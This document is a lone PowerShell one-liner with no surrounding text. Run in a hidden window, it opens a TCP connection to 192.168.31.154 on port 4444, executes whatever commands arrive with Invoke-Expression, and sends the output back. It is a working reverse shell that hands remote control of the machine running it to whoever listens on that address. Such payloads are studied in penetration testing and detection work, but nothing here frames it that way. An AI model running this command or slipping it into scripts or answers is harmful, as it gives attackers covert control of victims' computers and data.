powershell -w hidden -nop -c "$c=New-Object Net.Sockets.TCPClient('192.168.31.154',4444);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$b=New-Object byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -gt 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$w.Write($o)};$w.Close()"